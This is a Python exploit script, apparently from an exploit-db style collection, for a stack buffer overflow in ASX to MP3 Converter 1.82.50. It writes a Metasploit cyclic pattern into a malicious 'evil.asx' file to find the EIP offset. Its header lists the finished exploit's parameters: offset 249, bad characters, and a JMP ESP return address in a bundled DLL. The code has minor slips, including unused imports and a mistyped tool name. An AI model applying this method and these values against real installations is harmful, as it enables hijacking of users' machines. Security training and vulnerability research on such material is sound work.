#!/usr/bin/python
#	ASX to MP3 Converter 1.82.50 SOF exploit
#       Use this script to determine the correct EIP offset
#       Software: https://www.exploit-db.com/apps/b7c8c2a232e1d4a959c43970a877a799-ASXtoMP3Converter.exe
#       Date: 02 Oct 2022
#       Reference:
#       Author: Dylan Jenkins
#	Based on PoC by the totally real person: Ivan Ivanovic Ivanov
#	Reference: https://www.exploit-db.com/exploits/38382/
#	Tested on: Windows 2k3
#       EIP Offset: 249
#       Bad Chars: x00\x09\x0a\x1a
#       Return Address | dll: 0x1003789d ("\xFF\xEF", JMP ESP) | MSA2Multility03.dll
#       Usage: Open ASX to MP3 Converter application > load evil asx file > lookup characters in EIP > execute msf-patter_offset

import socket
import time
import sys

# Code used to generate filler:
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255

filler = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"

#   Lookup Usage:
#   msf-pattern_offset -l 255 -q 41336941
#   Output = [*] Exact match at offset 249

inputBuffer = filler

#   Create buffer asx file and print to user

print("\n .asx file buffer file creator, run as sudo/admin for file creation rights \n")
print("\nCreating evil asx file buffer to test control of EIP\n") 

print("\ninput buffer is:\n")
print(inputBuffer)
print("\ncreatingfile: evil.asx\n")
f = open("evil.asx", "w")
f.write(inputBuffer)
f.close()
   
print("\nclosing\n")
sys.exit()
